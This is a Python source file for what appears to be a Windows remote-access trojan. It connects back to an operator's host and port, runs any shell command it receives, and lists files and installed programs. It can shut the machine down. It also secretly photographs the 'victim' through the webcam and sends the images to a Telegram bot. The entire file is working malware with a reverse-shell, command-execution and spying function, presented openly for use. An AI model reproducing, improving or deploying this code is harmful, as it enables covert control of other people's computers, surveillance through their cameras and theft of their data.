import os
import sys
import socket

import telepot
from telepot.loop import MessageLoop

import threading
from time import sleep
import subprocess as sp

import numpy as np

#from TakePic import takepic
#from TakePic import name

from subprocess import PIPE
from base64 import b64encode

from random import randint
from cv2 import VideoCapture, imwrite

try:
    host = sys.argv[1]
    port = int(sys.argv[2])
except IndexError:
    host = "127.0.0.1"
    port = 4444


global bot
global help
global token
global chat_id
global start_bot

token = ""
chat_id = ""
start_bot = ""


start_bot=None


help = """
Special commands:
    help ; HELP!
    list apps ; list installed apps ( not working well )
    rickroll ; rickroll 
    getcwd ; starts displaying current working directory
    takepic / selphie / take pic; send picture from victim's camera to your bot
    kill; shutdown -s -t 0
"""



print(host, str(port))

def name():
    name = str(randint(80587, 909089909))+".png"
    return name

def takepic():
    cam = VideoCapture(0)

    name_ = name()
      
    result, image = cam.read()
    if result:
        imwrite(name_, image)
        return name_, image
    else:
        print("No image detected. Please! try again")

def list_apps(s):
    for i in range (1):
        procnec = sp.check_output(['wmic', 'product', 'get', 'name'])
        a = str(procnec)
    
        try:
            for i in range(len(a)):
                #print(a.split("\\r\\r\\n")[6:][i])
                s.send(a.split("\\r\\r\\n")[6:][i].encode())
      
        except IndexError as e:
            print("All Done")
            break
        break 

def recieve(s):

    filter = ["python", "powershell", "cmd", "python3", "pip"]
    nowshutup=False
    chat_id = ""
    token = ""

    #token=None
    #chat_id=None


    while True:
        try:
            data = s.recv(1024).decode()
        except ConnectionResetError:
            print("Conection reset by host")
            break

        if not data: 
            break

        elif data == "dirr":
            for dir in os.listdir():
                s.send(dir.encode())

        elif data == "getcwd":
            try:
                s.send(f"<UPDATEPATH>{os.getcwd()}".encode())
            except Exception as e:
                s.send(f"Shit : \n{e}".encode())

        elif data.startswith("cd"):
            dr=data.replace("\n","").replace("\r", "")[3:]
            s.send(dr.encode())
            try:
                os.chdir(dr)
                s.send(f"<UPDATEPATH>{os.getcwd()}".encode())
            except FileNotFoundError or FileExistsError:
                s.send("Folder not found..\n".encode())
            #s.send(dr.encode())

        elif data == "kill":
            os.system("shutdown -s -t 0")

        elif (data == "takepic" or data == "selphie" or data == "take pic") and start_bot:
            try:
                tmp_name = takepic()[0]
                bot.sendPhoto(chat_id, open(tmp_name, "rb"))
                s.send("Picture sent over the bot.".encode())
                os.remove(tmp_name)
                s.send("Picture removed from victim's machine.".encode())
                del tmp_name
            except Exception as e:
                s.send(f"\n{e}\n")

        elif data == "rickroll":
            os.system("start chrome https://youtu.be/dQw4w9WgXcQ")
            s.send("rickroll executed\n".encode())

        elif data.startswith("<TOKEN>"):
            token = data.replace("<TOKEN>", "")
            print(f"TOKEN : {token}")

        elif data.startswith("<CHAT_ID>"):
            chat_id = data.replace("<CHAT_ID>", "")
            print(f"CHAT ID : {chat_id}")
        

        elif data == "list apps":
            s.send("listing all the apps...\n".encode())
            lappTh = threading.Thread(target=list_apps, args=[s, ])
            lappTh.start()

        elif data == "help":
            s.send(help.encode())

        else: 
            if not(data.startswith("<")) and not("getcwd" in data) and not("takepic" in data) and not("rickroll" in data):
                exproc = sp.run(data, shell=True, stdout=PIPE, stderr=PIPE, encoding="cp850")
                output = str(exproc.stdout) + str(exproc.stderr)
                s.send(output.encode())
            else:
                print("The little shit")

        if token != "" and  chat_id.isdigit() and nowshutup==False:
            try:
                 start_bot = True
                 bot = telepot.Bot(token)
                 bot.sendMessage(int(chat_id), "Bot Activated starting functions")
                 nowshutup = True
            except Exception as e:
                s.send(f"Telegram :( \n{e}\n") 

                

def path_func(s, time):
    while True:
        sleep(1)
        current=os.getcwd()
        s.send(f"<PATH>{current}".encode())

def main(host, port):
    s = socket.socket()
    connectionfailed = 0

    while True:
        try:
            s.connect((host, port))
            break
        except ConnectionRefusedError:
            connectionfailed += 1
            print(f"Connection failed tryng again. ( {connectionfailed} )", end="\r")
            sleep(1)
            continue
        except OSError as e:
            if e.args[0] == 10056:
                break

    recieve(s)

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    text = msg['text']

def start_bot_func():
    MessageLoop(bot, handle).run_as_thread()


main_thread = threading.Thread(target=main, args=[host, port, ])
try:
    main_thread.start()
    while True:
        if start_bot:
            botThread = threading.Thread(target=start_bot_func)
            botThread.start()
except Exception as e:
    print(f"\n{e}\n")

